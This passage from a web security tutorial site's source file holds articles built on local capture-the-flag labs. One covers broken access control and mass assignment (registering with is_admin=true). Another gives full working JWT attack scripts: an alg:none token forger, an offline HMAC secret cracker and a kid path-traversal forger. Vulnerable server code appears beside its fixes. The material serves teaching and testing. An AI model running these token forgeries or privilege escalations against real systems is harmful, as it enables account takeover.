<p>Capture a legitimate request and change only its object ID. Test:</p>
<ul>
<li>the previous and next sequential IDs;</li>
<li>an ID belonging to another account;</li>
<li>an ID found through search, autocomplete, exports, or activity feeds;</li>
<li>read, update, and delete operations on the same object.</li>
</ul>
<h3 id="4-confirm-the-impact">4. Confirm the impact</h3>
<p>A changed response is a lead. A clear cross-account read or write is the finding. Record the original and modified request IDs so another person can reproduce it.</p>
<h2 id="summary">Summary</h2>
<p>In Lab 5, public clues led us from the current API to a forgotten, unauthenticated version. In Lab 6, a sequential invoice ID exposed another account’s data. In Lab 7, a search endpoint leaked an unguessable UUID and the document endpoint accepted possession of that UUID as authorization.</p>
<p>The common lesson is that the visible page is not the whole application, and a valid login is not the end of an authorization decision.</p>
<p>When you finish, close the sessions and stop the lab servers:</p>
<pre><code class="language-bash">$ h5i browser close --session lab05
$ h5i browser close --session lab06
$ h5i browser close --session lab07
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/broken-access-control/">Broken Access Control</a>, we will test authorization across two logged-in sessions and examine <strong>mass assignment</strong>: what happens when a client sends fields that the user interface never offered.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/05-recon-trail">Lab 5: Recon trail</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/06-idor-sequential">Lab 6: Sequential IDOR</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/07-idor-uuid">Lab 7: UUID IDOR</a></li>
</ul>""",
}


ACCESS = {
    "section": "guides", "slug": "broken-access-control", "published": "2026-09-15",
    "eyebrow": "Tutorial 02 / Access control", "time": "9 min",
    "tags": "Authorization &middot; Mass assignment &middot; Labs 8&ndash;9",
    "title": "Broken Access Control | h5i web security tutorial",
    "h1": "Broken Access Control",
    "description": "A beginner-friendly CTF tutorial: compare two logged-in users, test authorization directly, and find fields the user interface never sends.",
    "meta": "Compare two logged-in users, test authorization directly with --as, and find the fields a user interface never sends.",
    "deck": "A beginner-friendly CTF tutorial: compare two logged-in users, test authorization directly, and find fields the user interface never sends.",
    "next": ("/guides/jwt-attacks/", "Next in the series", "JWT Attacks", "Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>In <a href="/guides/recon-and-idor/">Recon and IDOR</a>, we discovered forgotten endpoints and used object identifiers to read data belonging to another account. Those attacks had one question underneath them: <em>Does the server check that this user is allowed to access this object?</em></p>
<p>In this article, we will make that question systematic. Using Labs 8 and 9 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will:</p>
<ul>
<li>replay the same request as two different users;</li>
<li>distinguish authentication from authorization;</li>
<li>add a privileged field that the signup form never offered; and</li>
<li>learn why server-side allowlists matter.</li>
</ul>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a>, a headless browser whose <code>websec</code> plugin records, edits, and replays the HTTP traffic produced by a browser session.</p>
<p>Both targets are deliberately vulnerable local applications. Only use these techniques on systems you own or have explicit permission to test.</p>
<h2 id="before-we-begin">Before we begin</h2>
<p>This article assumes that h5i and its <code>websec</code> plugin are installed. The complete instructions are in the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial repository</a>.</p>
<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
$ h5i websec --help
</code></pre>
<h2 id="authentication-and-authorization-are-different-checks">Authentication and authorization are different checks</h2>
<p><strong>Authentication</strong> establishes an identity: “This request came from Bob.”</p>
<p><strong>Authorization</strong> applies a rule to that identity: “Bob is an intern, so he cannot read the managers’ quarterly report.”</p>
<p>A valid session cookie proves only the first statement. Every sensitive endpoint still needs the second check.</p>
<p>The most direct authorization test is therefore:</p>
<ol>
<li>perform an action as a privileged user;</li>
<li>capture the exact request;</li>
<li>send that same request with a less privileged user’s credentials; and</li>
<li>compare the responses.</li>
</ol>
<p>Changing only the identity makes the result easy to interpret.</p>
<h2 id="lab-8-send-alices-request-as-bob">Lab 8: send Alice’s request as Bob</h2>
<p>Start the ledger lab:</p>
<pre><code class="language-bash">$ ./run.sh 08
</code></pre>
<p>The application has two users:</p>
<ul>
<li><code>alice</code>, a manager;</li>
<li><code>bob</code>, an intern.</li>
</ul>
<p>The quarterly report should be restricted to managers. First, create an independent browser session for Alice:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9080/' \
  --session alice --new --capture

$ h5i websec replay req_0 --session alice --create \
  --set method=POST \
  --set path=/login \
  --set header.Content-Type=application/json \
  --set json.user=alice
</code></pre>
<p><code>--create</code> is required because the captured homepage request was a <code>GET</code> with no JSON body. We are deliberately creating fields that were not in that request.</p>
<p>The login response sets Alice’s session cookie. Because it belongs to the named <code>alice</code> session, later requests from that session use it automatically.</p>
<p>Now capture the report request:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session alice --create \
  --set path=/api/reports/quarterly
$ h5i websec show res_2 --session alice --raw
</code></pre>
<p>The response identifies Alice as a manager and includes the quarterly data. This establishes the expected privileged behavior.</p>
<p>Next, create a separate session for Bob:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9080/' \
  --session bob --new --capture

$ h5i websec replay req_0 --session bob --create \
  --set method=POST \
  --set path=/login \
  --set header.Content-Type=application/json \
  --set json.user=bob
</code></pre>
<p>We now have two independent cookie jars. Alice’s session contains Alice’s login cookie; Bob’s contains Bob’s.</p>
<h3 id="replay-the-same-message-with-another-identity">Replay the same message with another identity</h3>
<p>Alice’s report request is <code>req_2</code> in the <code>alice</code> session. Send that message using Bob’s session:</p>
<pre><code class="language-bash">$ h5i websec replay req_2 --session alice --as bob
</code></pre>
<p><code>--session alice</code> tells h5i where the recorded message comes from. <code>--as bob</code> tells it which session’s cookies, browser identity, policy, and network receipts should be used to send it.</p>
<p>The replay prints its <code>seq</code>, and that number belongs to <strong>Bob’s</strong> session, because that is where the message was actually sent from and recorded. Read the body there:</p>
<pre><code class="language-bash">$ h5i websec show res_2 --session bob --raw
</code></pre>
<p>If your <code>seq</code> differs, use the number the replay printed. Reading <code>res_N</code> from the <code>alice</code> session is a common mistake here: it either fails or shows you Alice’s own earlier response, which looks like a finding and is not one.</p>
<p>The response is still <code>200 OK</code>. More importantly, its body says:</p>
<pre><code class="language-json">{
  &quot;as&quot;: &quot;bob&quot;,
  &quot;role&quot;: &quot;intern&quot;,
  &quot;revenue&quot;: 4120000,
  &quot;audit_key&quot;: &quot;FLAG{cross_session_authz}&quot;
}
</code></pre>
<p>The request was genuinely sent as Bob. The server authenticated him correctly and then returned the managers’ report anyway.</p>
<h3 id="why-did-this-work">Why did this work?</h3>
<p>The report handler contains an authentication check:</p>
<pre><code class="language-python">user = SESSIONS.get(req.cookies.get(&quot;sid&quot;, &quot;&quot;))
if not user:
    return js({&quot;error&quot;: &quot;sign in&quot;}, 401)

return js({
    &quot;as&quot;: user,
    &quot;role&quot;: USERS[user],
    &quot;revenue&quot;: 4_120_000,
    &quot;audit_key&quot;: FLAG,
})
</code></pre>
<p>The handler asks whether the caller is signed in. It never checks whether the signed-in user is a manager.</p>
<p>The user interface does not show Bob a link to the report, but hiding a link is not access control. Bob can still send the underlying HTTP request.</p>
<p>A correct handler performs both checks:</p>
<pre><code class="language-python">if not user:
    return js({&quot;error&quot;: &quot;sign in&quot;}, 401)
if USERS[user] != &quot;manager&quot;:
    return js({&quot;error&quot;: &quot;forbidden&quot;}, 403)
</code></pre>
<p>For larger applications, role requirements are often safer when attached centrally to routes or policies rather than copied into individual handlers.</p>
<h3 id="interpreting-an-identity-swap">Interpreting an identity swap</h3>
<p>After replaying a request as another user, read the body as well as the status:</p>
<ul>
<li><code>200</code> with Alice’s data means broken authorization.</li>
<li><code>200</code> with Bob’s correctly scoped data may be safe.</li>
<li><code>401</code> means Bob’s credential was missing or unusable.</li>
<li><code>403</code> usually means the authorization control worked.</li>
</ul>
<p>A <code>200</code> alone is not enough to report a vulnerability. You must determine whose data or action the response represents.</p>
<h2 id="lab-9-add-a-field-the-form-never-offered">Lab 9: add a field the form never offered</h2>
<p>Lab 8 changed the user sending a request. Lab 9 keeps the user but changes the shape of the object being created.</p>
<p>Start the signup lab:</p>
<pre><code class="language-bash">$ ./run.sh 09
</code></pre>
<p>Open the homepage with capture enabled:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9090/' \
  --session lab09 --new --capture
</code></pre>
<p>The page documents a registration endpoint that expects:</p>
<pre><code class="language-json">{
  &quot;username&quot;: &quot;newuser&quot;,
  &quot;email&quot;: &quot;newuser@example.test&quot;,
  &quot;password&quot;: &quot;hunter2&quot;
}
</code></pre>
<p>Create a normal account first:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
  --set method=POST \
  --set path=/api/register \
  --set header.Content-Type=application/json \
  --set json.username=ordinary \
  --set json.email=ordinary@example.test \
  --set json.password=hunter2
</code></pre>
<p>The response contains a bearer token. Copy it and try the admin endpoint:</p>
<pre><code class="language-bash">$ h5i websec show res_1 --session lab09 --raw
$ NORMAL_TOKEN='PASTE_THE_TOKEN_HERE'
</code></pre>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
  --set path=/api/admin/keys \
  --set &quot;header.Authorization=Bearer $NORMAL_TOKEN&quot;
</code></pre>
<p>The normal account receives <code>403 Forbidden</code>, as expected.</p>
<h3 id="what-is-mass-assignment">What is mass assignment?</h3>
<p>Many frameworks can convert request fields into an application object automatically. That is convenient until the internal object contains fields that an ordinary user should never control.</p>
<p>For example, the public form may send <code>username</code>, <code>email</code>, and <code>password</code>, while the stored user record also contains:</p>
<pre><code class="language-json">{
  &quot;plan&quot;: &quot;free&quot;,
  &quot;is_admin&quot;: false,
  &quot;credits&quot;: 0
}
</code></pre>
<p>If the server copies every supplied field into that record, we can submit <code>is_admin</code> ourselves even though the form never displayed it. This vulnerability is called <strong>mass assignment</strong>, <strong>over-posting</strong>, or <strong>unsafe object binding</strong>.</p>
<p>Register a second user and add the privileged field:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
  --set method=POST \
  --set path=/api/register \
  --set header.Content-Type=application/json \
  --set json.username=climber \
  --set json.email=climber@example.test \
  --set json.password=hunter2 \
  --set json.is_admin=true
</code></pre>
<p>Notice that <code>true</code> is not quoted. h5i sends it as a JSON boolean:</p>
<pre><code class="language-json">&quot;is_admin&quot;: true
</code></pre>
<p>Copy the new token from the registration response and send it to the admin endpoint:</p>
<pre><code class="language-bash">$ h5i websec show res_3 --session lab09 --raw
$ ADMIN_TOKEN='PASTE_THE_NEW_TOKEN_HERE'
</code></pre>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
  --set path=/api/admin/keys \
  --set &quot;header.Authorization=Bearer $ADMIN_TOKEN&quot;
</code></pre>
<p>The response now contains:</p>
<pre><code class="language-text">FLAG{mass_assignment}
</code></pre>
<p>We did not change a user after registration. We created an account that was already an administrator.</p>
<h3 id="why-did-this-work_1">Why did this work?</h3>
<p>The vulnerable code merges the entire request body into the default user:</p>
<pre><code class="language-python">DEFAULTS = {
    &quot;username&quot;: &quot;&quot;,
    &quot;email&quot;: &quot;&quot;,
    &quot;password&quot;: &quot;&quot;,
    &quot;plan&quot;: &quot;free&quot;,
    &quot;is_admin&quot;: False,
    &quot;credits&quot;: 0,
}

row = {**DEFAULTS, **payload}
USERS[row[&quot;username&quot;]] = row
</code></pre>
<p>In Python, values appearing later in this merge replace earlier values. Therefore, the attacker-supplied <code>is_admin: true</code> overwrites the safe default.</p>
<p>The server should select the allowed public fields explicitly:</p>
<pre><code class="language-python">allowed = {&quot;username&quot;, &quot;email&quot;, &quot;password&quot;}
public = {k: v for k, v in payload.items() if k in allowed}
row = {**DEFAULTS, **public}
</code></pre>
<p>An allowlist says which fields a caller may set. A blocklist says which known fields they may not set—and silently becomes incomplete when a new sensitive field is added later.</p>
<h3 id="where-to-look-for-hidden-fields">Where to look for hidden fields</h3>
<p>When the source is unavailable, field names often appear in:</p>
<ul>
<li>registration and profile responses;</li>
<li><code>GET /api/me</code> or user-detail endpoints;</li>
<li>JavaScript state embedded in a page;</li>
<li>update requests sent by an administrator;</li>
<li>error messages and API documentation.</li>
</ul>
<p>Common candidates include <code>role</code>, <code>is_admin</code>, <code>is_staff</code>, <code>verified</code>, <code>plan</code>, <code>credits</code>, <code>owner_id</code>, and <code>tenant_id</code>.</p>
<p>Test create and update endpoints separately. A signup endpoint may use an allowlist while <code>PATCH /api/me</code> binds the entire request into an existing database record.</p>
<h2 id="a-reusable-authorization-workflow">A reusable authorization workflow</h2>
<p>The two labs produce a compact testing method:</p>
<ol>
<li>Keep one named h5i session per user or role.</li>
<li>Capture a legitimate sensitive request from the privileged session.</li>
<li>Replay it with <code>--as</code> for every lower-privileged session.</li>
<li>Check whose data was returned—not only the status code.</li>
<li>For create and update requests, add one plausible internal field at a time.</li>
<li>Confirm impact with an unauthorized read, write, or privileged action.</li>
</ol>
<p>Named sessions matter because mixed cookie jars produce ambiguous evidence. If Alice’s credential accidentally remains in Bob’s request, a successful response proves nothing.</p>
<h2 id="summary">Summary</h2>
<p>Lab 8 showed an endpoint that authenticated Bob but never checked his role. h5i’s <code>--as</code> option let us keep Alice’s recorded request constant while replacing the sending identity.</p>
<p>Lab 9 showed a registration endpoint that accepted every JSON field and copied it into the user record. Adding <code>is_admin: true</code> turned an ordinary signup into an administrator account.</p>
<p>The shared lesson is that the client does not define the security boundary. A hidden link can still be requested, and a hidden field can still be submitted. The server must authorize every sensitive action and allowlist every client-controlled field.</p>
<p>When finished:</p>
<pre><code class="language-bash">$ h5i browser close --session alice
$ h5i browser close --session bob
$ h5i browser close --session lab09
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/jwt-attacks/">JWT Attacks</a>, we will examine JSON Web Tokens and attack the code that decides whether a token’s signature should be trusted.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/08-cross-session-authz">Lab 8: Cross-session authorization</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/09-mass-assignment">Lab 9: Mass assignment</a></li>
</ul>""",
}


JWT = {
    "section": "guides", "slug": "jwt-attacks", "published": "2026-09-13",
    "eyebrow": "Tutorial 03 / Tokens", "time": "9 min",
    "tags": "JWT &middot; alg confusion &middot; kid injection &middot; Labs 10&ndash;11",
    "title": "JWT Attacks | h5i web security tutorial",
    "h1": "JWT Attacks",
    "description": "A beginner-friendly CTF tutorial: decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
    "meta": "Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
    "deck": "A beginner-friendly CTF tutorial: decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
    "next": ("/guides/sql-injection/", "Next in the series", "SQL Injection", "Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>In <a href="/guides/broken-access-control/">Broken Access Control</a>, we tested access control by changing the user and the fields in a request. In this article, we will attack a different part of authentication: the token that tells the server who the user is.</p>
<p>Using Labs 10 and 11 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn:</p>
<ul>
<li>what the three parts of a JSON Web Token mean;</li>
<li>why decoding a JWT does not verify it;</li>
<li>how <code>alg: none</code> can make a signature optional;</li>
<li>why a weak HMAC secret can be tested offline; and</li>
<li>how an unsafe <code>kid</code> lookup can let an attacker choose the verification key.</li>
</ul>
<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture a real token, construct modified versions, and replay a request with a different <code>Authorization</code> header.</p>
<p>The targets are deliberately vulnerable local labs. Only test systems you own or have explicit permission to assess.</p>
<h2 id="before-we-begin">Before we begin</h2>
<p>You need Python 3.11 or later, h5i, and the <code>websec</code> plugin. See the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">course setup</a> for installation details.</p>
<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
$ h5i websec --help
</code></pre>
<h2 id="what-is-a-jwt">What is a JWT?</h2>
<p>A <strong>JSON Web Token</strong>, or <strong>JWT</strong>, is a compact string commonly used to carry claims about a user. A token usually looks like this:</p>
<pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJndWVzdCJ9.signature
</code></pre>
<p>It has three dot-separated parts:</p>
<pre><code class="language-text">header.payload.signature
</code></pre>
<p>The <strong>header</strong> describes how the token is signed. The <strong>payload</strong> contains claims such as the user ID, role, issuer, and expiration time. The <strong>signature</strong> lets the server detect changes to the first two parts.</p>
<p>The header and payload are normally Base64url-encoded. Base64 is an encoding, not encryption. Anyone holding the token can decode and modify those sections. Security comes from the server verifying the signature with the correct algorithm and key.</p>
<p>That verification step is exactly what we will test.</p>
<h2 id="lab-10-inspect-the-guest-token">Lab 10: inspect the guest token</h2>
<p>Start the Passport lab:</p>
<pre><code class="language-bash">$ ./run.sh 10
</code></pre>
<p>Open the token endpoint:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9100/api/token' \
  --session lab10 --new --capture
$ h5i websec show res_0 --session lab10 --raw
</code></pre>
<p>The response contains a guest JWT. Copy the token into a shell variable:</p>
<pre><code class="language-bash">$ TOKEN='PASTE_THE_TOKEN_HERE'
</code></pre>
<p>Decode its header and payload:</p>
<pre><code class="language-bash">$ TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
import base64
import json
import os

token = os.environ[&quot;TOKEN&quot;]
decode = lambda part: base64.urlsafe_b64decode(
    part + &quot;=&quot; * (-len(part) % 4)
)

header, payload, signature = token.split(&quot;.&quot;)
print(json.loads(decode(header)))
print(json.loads(decode(payload)))
print(&quot;signature bytes:&quot;, len(decode(signature)))
PY
</code></pre>
<p>The result is similar to:</p>
<pre><code class="language-text">{'alg': 'HS256', 'typ': 'JWT'}
{'sub': 'guest', 'role': 'guest', 'iss': 'passport'}
signature bytes: 32
</code></pre>
<p><code>HS256</code> means the server uses HMAC with SHA-256. The server and token issuer share a secret key. The header and payload are signed using that key, and the server should reject any token whose signature does not match.</p>
<h2 id="attack-1-make-the-signature-optional">Attack 1: make the signature optional</h2>
<p>The JWT header is attacker-controlled input. A dangerous verifier may read the algorithm from that header and accept <code>none</code>, meaning no cryptographic signature.</p>
<p>Create a token whose payload claims the <code>admin</code> role:</p>
<pre><code class="language-bash">$ FORGED=$(python3 - &lt;&lt;'PY'
import base64
import json

def part(obj):
    raw = json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()

header = part({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;})
payload = part({
    &quot;sub&quot;: &quot;guest&quot;,
    &quot;role&quot;: &quot;admin&quot;,
    &quot;iss&quot;: &quot;passport&quot;,
})
print(header + &quot;.&quot; + payload + &quot;.&quot;)
PY
)
</code></pre>
<p>The trailing dot matters. It leaves the third, signature segment empty while preserving the three-part JWT structure.</p>
<p>Replay the captured request, changing its path and adding the token:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
  --set path=/api/vault \
  --set &quot;header.Authorization=Bearer $FORGED&quot;
</code></pre>
<p>Note the <code>seq</code> in the replay output and inspect the corresponding response:</p>
<pre><code class="language-bash">$ h5i websec show res_1 --session lab10 --raw
</code></pre>
<p>The response contains:</p>
<pre><code class="language-text">FLAG{jwt_alg_confusion}
</code></pre>
<p>We changed the role without knowing any secret because the verifier accepted a token with no signature.</p>
<h3 id="why-did-this-work">Why did this work?</h3>
<p>The vulnerable verifier reads <code>alg</code> from the untrusted token:</p>
<pre><code class="language-python">alg = head.get(&quot;alg&quot;, &quot;HS256&quot;)

if alg.lower() == &quot;none&quot;:
    return claims
</code></pre>
<p>The <code>none</code> branch returns the claims before verifying a signature. The attacker therefore controls both the decision to skip verification and the claims returned after it.</p>
<p>The server must choose the accepted algorithm. The token must not choose how its own authenticity will be checked.</p>
<h2 id="attack-2-crack-a-weak-hmac-secret">Attack 2: crack a weak HMAC secret</h2>
<p>Lab 10 contains a second, independent weakness. Even when it follows the <code>HS256</code> path, the signing secret is a dictionary word.</p>
<p>An HMAC JWT gives us everything required to test candidate secrets locally:</p>
<ul>
<li>the encoded header and payload;</li>
<li>the correct signature; and</li>
<li>the signing algorithm.</li>
</ul>
<p>Testing guesses requires no further requests to the server. This is an <strong>offline attack</strong>, so login rate limits do not help.</p>
<p>Try a small wordlist against the original guest token:</p>
<pre><code class="language-bash">$ SECRET=$(TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
import base64
import hashlib
import hmac
import os

token = os.environ[&quot;TOKEN&quot;]
signed, _, signature = token.rpartition(&quot;.&quot;)

def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()

words = [
    &quot;secret&quot;,
    &quot;password&quot;,
    &quot;changeme&quot;,
    &quot;letmein&quot;,
    &quot;jwt&quot;,
    &quot;key&quot;,
    &quot;admin&quot;,
    &quot;test&quot;,
]

for word in words:
    candidate = hmac.new(
        word.encode(),
        signed.encode(),
        hashlib.sha256,
    ).digest()
    if hmac.compare_digest(b64(candidate), signature):
        print(word)
        break
PY
)

$ printf '%s\n' &quot;$SECRET&quot;
letmein
</code></pre>
<p>Now use that secret to create a correctly signed admin token:</p>
<pre><code class="language-bash">$ SIGNED_ADMIN=$(SECRET=&quot;$SECRET&quot; python3 - &lt;&lt;'PY'
import base64
import hashlib
import hmac
import json
import os

def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()

def part(obj):
    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())

header = part({&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;})
payload = part({
    &quot;sub&quot;: &quot;guest&quot;,
    &quot;role&quot;: &quot;admin&quot;,
    &quot;iss&quot;: &quot;passport&quot;,
})
signed = header + &quot;.&quot; + payload
signature = hmac.new(
    os.environ[&quot;SECRET&quot;].encode(),
    signed.encode(),
    hashlib.sha256,
).digest()

print(signed + &quot;.&quot; + b64(signature))
PY
)
</code></pre>
<p>Send it to the same endpoint:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
  --set path=/api/vault \
  --set &quot;header.Authorization=Bearer $SIGNED_ADMIN&quot;
</code></pre>
<p>This token passes the normal signature check. The vulnerability is no longer a missing check; it is a signing key that an attacker can recover cheaply.</p>
<p>Use a randomly generated secret with enough entropy, store it outside source code, and rotate it when exposure is possible.</p>
<h2 id="lab-11-when-kid-becomes-a-file-path">Lab 11: when <code>kid</code> becomes a file path</h2>
<p>Start the Keyring lab:</p>
<pre><code class="language-bash">$ ./run.sh 11
</code></pre>
<p>Open its token endpoint and inspect the returned JWT:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9110/api/token' \
  --session lab11 --new --capture
$ h5i websec show res_0 --session lab11 --raw
</code></pre>
<p>Decode the token as before. This header contains an additional field:</p>
<pre><code class="language-json">{
  &quot;alg&quot;: &quot;HS256&quot;,
  &quot;typ&quot;: &quot;JWT&quot;,
  &quot;kid&quot;: &quot;main.key&quot;
}
</code></pre>
<p><code>kid</code> means <strong>key ID</strong>. It lets a verifier choose among multiple signing keys, which is useful during key rotation.</p>
<p>The danger is that the value comes from the untrusted token. The server must map it to a known key safely.</p>
<p>In this lab, it does not:</p>
<pre><code class="language-python">def key_for(kid):
    return (ROOT / &quot;keys&quot; / kid).read_bytes()
</code></pre>
<p>The server treats <code>kid</code> as part of a filesystem path. Therefore:</p>
<pre><code class="language-text">../static/brand.txt
</code></pre>
<p>escapes the <code>keys</code> directory and selects a public static file as the HMAC key.</p>
<p>We do not need to read the real secret key. We need to make the verifier use a file whose bytes we already know.</p>
<h3 id="save-the-exact-key-bytes">Save the exact key bytes</h3>
<p>Fetch the public brand file through the same captured session:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 \
  --set path=/static/brand.txt

$ WORK=$(mktemp -d)
$ h5i websec show res_1 --session lab11 \
  --body-to &quot;$WORK/brand.txt&quot;
</code></pre>
<p><code>--body-to</code> writes the response body exactly as received. That matters because the file includes a trailing newline. Copying visible terminal text can lose that byte and produce the wrong HMAC.</p>
<p>Now create an admin token whose <code>kid</code> points to the public file:</p>
<pre><code class="language-bash">$ FORGED=$(python3 - &quot;$WORK/brand.txt&quot; &lt;&lt;'PY'
import base64
import hashlib
import hmac
import json
import sys

key = open(sys.argv[1], &quot;rb&quot;).read()

def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()

def part(obj):
    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())

header = part({
    &quot;alg&quot;: &quot;HS256&quot;,
    &quot;typ&quot;: &quot;JWT&quot;,
    &quot;kid&quot;: &quot;../static/brand.txt&quot;,
})
payload = part({&quot;sub&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;})
signed = header + &quot;.&quot; + payload
signature = hmac.new(key, signed.encode(), hashlib.sha256).digest()

print(signed + &quot;.&quot; + b64(signature))
PY
)
</code></pre>
<p>Send it to the protected HSM endpoint:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 --create \
  --set path=/api/hsm \
  --set &quot;header.Authorization=Bearer $FORGED&quot;
</code></pre>
<p>The response contains:</p>
<pre><code class="language-text">FLAG{jwt_kid_injection}
</code></pre>
<p>The signature is cryptographically valid. The bug is that the attacker selected the key used to validate it.</p>
<h3 id="fixing-key-selection">Fixing key selection</h3>
<p>The safe pattern is a fixed server-side map:</p>
<pre><code class="language-python">KEYS = {
    &quot;main-2026&quot;: current_key,
    &quot;main-2025&quot;: previous_key,
}

key = KEYS.get(header.get(&quot;kid&quot;))
if key is None:
    reject()
</code></pre>
<p>Reject unknown identifiers. Do not concatenate <code>kid</code> into a path, SQL query, shell command, or arbitrary URL.</p>
<p>JWT headers such as <code>jku</code> and <code>x5u</code> can name remote key locations. A verifier should ignore them unless the application has a strict, server-controlled allowlist and a genuine need to fetch keys remotely.</p>
<h2 id="a-reusable-jwt-testing-method">A reusable JWT testing method</h2>
<p>When an application gives you a JWT:</p>
<ol>
<li>Decode the header and payload without assuming they are trustworthy.</li>
<li>Identify the algorithm and every key-selection field.</li>
<li>Check whether the verifier accepts an unsigned token.</li>
<li>If HMAC is used, test whether the secret is weak—offline.</li>
<li>Follow <code>kid</code>, <code>jku</code>, and <code>x5u</code> into the code or behavior that resolves the key.</li>
<li>Check important claims such as issuer, audience, and expiration.</li>
<li>Confirm the result by reaching a protected action, not merely by creating a token-shaped string.</li>
</ol>
<p>Do not report “the JWT can be decoded.” That is normal. The finding begins when modified claims pass verification or when a token is accepted outside the context for which it was issued.</p>
<h2 id="summary">Summary</h2>
<p>Lab 10 showed two independent JWT failures. <code>alg: none</code> allowed us to omit the signature, while a weak HMAC secret allowed us to generate a valid signature ourselves.</p>
<p>Lab 11 used a valid HMAC construction with a dangerous key lookup. By placing <code>../static/brand.txt</code> in <code>kid</code>, we made the server verify our token using public bytes.</p>
<p>The common lesson is that cryptography does not rescue unsafe control flow. The server must fix the algorithm, validate all required claims, and select keys only from trusted server-side configuration.</p>
<p>When finished:</p>
<pre><code class="language-bash">$ h5i browser close --session lab10
$ h5i browser close --session lab11
$ rm -rf &quot;$WORK&quot;
$ ./run.sh stop
</code></pre>
<p>In <a href="/guides/sql-injection/">SQL Injection</a>, we will move from authentication to SQL injection, beginning with visible database errors and ending with secrets extracted one bit—or one delay—at a time.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/10-jwt-alg-confusion">Lab 10: JWT algorithm confusion</a></li>
<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/11-jwt-kid-injection">Lab 11: JWT <code>kid</code> injection</a></li>
</ul>""",
}


SQLI = {
    "section": "guides", "slug": "sql-injection", "published": "2026-09-15",
    "eyebrow": "Tutorial 04 / Injection", "time": "11 min",
    "tags": "SQLi &middot; Boolean and timing oracles &middot; Labs 12&ndash;14",
    "title": "SQL Injection | h5i web security tutorial",
    "h1": "SQL Injection",
    "description": "A beginner-friendly CTF tutorial: turn a broken search query into a database read, then extract secrets when the application reveals only a boolean—or only its response time.",
